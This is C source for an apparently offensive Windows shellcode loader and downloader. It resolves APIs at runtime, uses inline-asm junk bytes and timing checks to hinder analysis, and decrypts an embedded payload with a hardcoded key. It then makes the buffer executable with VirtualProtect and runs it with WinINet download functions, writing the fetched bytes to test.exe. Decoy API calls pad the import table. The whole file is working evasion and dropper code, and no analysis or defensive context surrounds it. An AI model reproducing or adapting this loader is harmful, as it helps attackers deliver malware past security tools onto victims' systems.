#include "loader.h"
#include "payload_enc.c"
// #include "entropy_low.c"
extern void setTrapFlag(void);
extern void stepOverExit(void);
extern void appendByteExit(void);


typedef unsigned int (*payload)(unsigned long long*);
typedef WINBOOL (NTAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef void (WINAPI*pGetSystemTime)(void);
typedef HANDLE (WINAPI*pCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef WINBOOL (WINAPI*pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
typedef WINBOOL (WINAPI*pCloseHandle)(HANDLE hObject);

typedef HINTERNET (WINAPI*pInternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
typedef HINTERNET (WINAPI*pInternetOpenUrlA)(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
typedef WINBOOL (WINAPI*pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef WINBOOL (WINAPI*pInternetCloseHandle)(HINTERNET hInternet);
typedef DWORD (WINAPI*pGetLastError)(void);
typedef void (WINAPI*pExitProcess)(UINT uExitCode);

pGetSystemTime _GetSystemTime = NULL;
pExitProcess _ExitProcess = NULL;

#define TOMFOOLERY asm volatile(\
        "call appendByte2Rip\n\t"\
        ".byte 0x9a\n\t"\
    );

// DO NOT CALL BEFORE FETCHING _GetSystemTime
#define RECORD_TIME asm volatile(\
        "call pushTime\n\t"\
        ".byte 0x9a\n\t"\
        ::: "%rax","%rcx","%r11","%rdi"\
);


#define CHECK_TIME asm volatile(\
        "call loadTime\n\t"\
        ".byte 0x9a\n\t"\
        ::: "%rax","%rcx","%r11","%rdi"\
);

#define RANDOM_BYTE asm volatile(\
    ".byte 0x9a"\
);

#define SHORT_JMP asm volatile(\
    ".word 0x01eb\n\t"\
    ".byte 0x9a\n\t"\
);

#define OBFUSCATE_WIN_CALL asm volatile(\
    "call callSecretWIN\n\t"\
    ".byte 0x9a\n\t"\
);

// #define DYNAMIC_RETURN asm volatile(\
//     ".byte 0xe8\n\t"\
//     ".dword "\
// )


// VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
#define VIRT_PROTECT_OBF(data, size, perms, junk_ptr) asm volatile(\
        "mov %0, %%rcx\n\t"\
        "mov %1, %%edx\n\t"\
        "mov %2, %%r8d\n\t"\
        "mov %3, %%r9\n\t"\
        "call callSecretWIN\n\t"\
        ".byte 0x64\n\t"\
        "call VirtualProtect\n\t"\
        : : "r" (data), "i" (size), "i" (perms), "r" (junk_ptr) : "%rdi"\
);


void DBGLG(char buf[], ...){
    #ifdef DEBUG
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}



/*
    args = {
        InternetOpen,
        InternetOpenUrlA,
        InternetReadFile,
        InternetCloseHandle,
        unsigned char* buf,
        int* sz,
        stepOverExit
    }
*/
// unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL, stepOverExit};
unsigned long long args[] = {NULL, NULL, NULL, NULL, NULL, NULL, stepOverExit};
unsigned short kernelbase[] = L"KernelBase.dll";
unsigned short wininet[] =L"wininet.dll";
unsigned short user32[] = L"user32.dll";
int pseudo_main(){
    unsigned char MasterKey[16];
    int sz = 0;
    payload p;
    unsigned char KeyList[176];
    DWORD junk[sizeof(PDWORD)];
    unsigned char execute_me[sizeof(payload_enc_bytes)];
    unsigned char buf[200 * 1024];
    TOMFOOLERY
    INIT_CONST();
    HMODULE Kernel32Module = _LoadLibrary(kernelbase);
    HMODULE WininetModule = _LoadLibrary(wininet);
    HMODULE user32Module = _LoadLibrary(user32);
    MessageBoxWFunc MessageBoxWPtr = (MessageBoxWFunc)(_GetProcAddress(user32Module, "MessageBoxW"));
    pVirtualProtect _VirtualProtect = (pVirtualProtect)_GetProcAddress(Kernel32Module, "VirtualProtect");
    // pGetSystemTime _GetSystemTime = (pGetSystemTime)_GetProcAddress(Kernel32Module, L"GetSystemTime");
    pCreateFileW _CreateFileW = (pCreateFileW)_GetProcAddress(Kernel32Module, "CreateFileW");
    pWriteFile _WriteFile = (pWriteFile)_GetProcAddress(Kernel32Module, "WriteFile");
    pCloseHandle _CloseHandle = (pCloseHandle)_GetProcAddress(Kernel32Module, "CloseHandle");
    _GetSystemTime = _GetProcAddress(Kernel32Module, "GetSystemTime");
    pInternetOpenW _InternetOpen = (pInternetOpenW)_GetProcAddress(WininetModule, "InternetOpenW");
    pInternetOpenUrlA _InternetOpenUrlA = (pInternetOpenUrlA)_GetProcAddress(WininetModule, "InternetOpenUrlA");
    pInternetReadFile _InternetReadFile = (pInternetReadFile)_GetProcAddress(WininetModule, "InternetReadFile");
    pInternetCloseHandle _InternetCloseHandle = (pInternetCloseHandle)_GetProcAddress(WininetModule, "InternetCloseHandle");
    pGetLastError _GetLastError = (pGetLastError)_GetProcAddress(Kernel32Module,"GetLastError");
    _ExitProcess = (pExitProcess)_GetProcAddress(Kernel32Module, "ExitProcess");
    if (!_ExitProcess){
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
  }
    RECORD_TIME
    args[0] = _InternetOpen;
    args[1] = _InternetOpenUrlA;
    args[2] = _InternetReadFile;
    args[3] = _InternetCloseHandle;

    for (int i = 0; i< 16; ++i){
        MasterKey[i] = i*16 + i;
    }
    args[4] = buf;
    args[5] = &sz;
    HANDLE hFile = _CreateFileW(L"./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }
    // RANDOM_BYTE
    SHORT_JMP
    memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
    KeyScheduler(MasterKey, KeyList);
    for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
        Decrypt(execute_me + i, KeyList);
    }
    CHECK_TIME
    _VirtualProtect(execute_me, sizeof(payload_enc_bytes),PAGE_EXECUTE_READWRITE, &junk);
    CHECK_TIME
    p = (payload)(execute_me);
    CHECK_TIME
    p(args);
    DWORD bytesWritten;
    BOOL result = _WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);
    if (!result) {
        _CloseHandle(hFile);
        return 1;
    }
    _CloseHandle(hFile);
    MessageBoxWPtr(NULL, L"OK", L"OK", MB_OK);
    return 0;
}

void WinMainCRTStartup(){
    pseudo_main();
    _ExitProcess(0);
}